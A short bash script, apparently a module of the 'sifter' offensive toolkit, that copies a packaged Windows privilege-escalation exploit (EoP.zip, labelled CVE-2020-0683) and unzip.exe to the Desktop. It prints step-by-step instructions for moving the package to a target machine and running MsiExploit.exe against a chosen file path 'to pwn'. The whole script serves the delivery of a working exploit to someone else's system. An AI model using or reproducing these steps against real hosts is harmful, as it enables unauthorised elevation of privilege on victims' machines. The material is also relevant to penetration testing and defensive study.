#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'
ORNG='\033[0;33m'
W='\033[1;37m'
INV='\e[7m'
URED='\033[4;31m'
UBLUE='\033[4;34m'

echo -e "${INV}"
sudo cp /opt/sifter/modules/postex/EoP/EoP.zip -t /home/$USER/Desktop
sudo cp /opt/sifter/extras/unzip.exe -t /home/$USER/Desktop
sudo chown $USER:$USER /home/$USER/Desktop/EoP.zip /home/$USER/Desktop/unzip.exe
figlet -f mini "EoP Exploit (CVE-2020-0683)"
echo -e "${URED}EoP.zip ${W}has been copied to your Desktop. Please transfer this file to target and unzip in a CLI"
echo -e "then cd into bin_MsiExploit. Please ensure MsiExploit.exe & foo.msi stay in the same directory or this will fail!"
echo -e "then run ${UBLUE}"MsiExploit.exe  \path\file\to\pwn" ${W}from a command terminal on target${NC}"
echo -e "     ${W}===================================== ${NC} "
echo -e "${ORNG}unzip.exe ${INV} has been moved to your desktop as well \nso you can easily unzip your files${NC}"

sleep 10


##########################______________ VGhlIERlYWQgQnVubnkgQ2x1Yg== ______________##########################
